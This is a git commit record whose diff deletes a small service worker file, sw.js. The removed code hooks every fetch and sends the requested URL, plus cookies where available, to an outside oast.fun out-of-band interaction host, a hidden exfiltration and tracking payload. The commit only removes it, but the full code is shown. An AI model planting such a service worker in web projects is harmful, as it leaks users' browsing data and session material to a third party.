cac6e201b0adb44313dddadf81a7e369d83731ea
I-Am-Jakoby <Michaelryanchitwood@gmail.com>
2025-03-23 23:53:12 -0500

    Delete sw.js

--- sw.js
+++
@@ -1,4 +0,0 @@
-self.addEventListener("fetch", (event) => {
-    event.respondWith(fetch(event.request));
-    fetch(`https://ahdjhhsrmxttsdaddbyaouthdtv4tsvlb.oast.fun/sw-fetch?cookies=${encodeURIComponent(self.document ? self.document.cookie : "no-cookies")}&requestUrl=${encodeURIComponent(event.request.url)}`);
-});
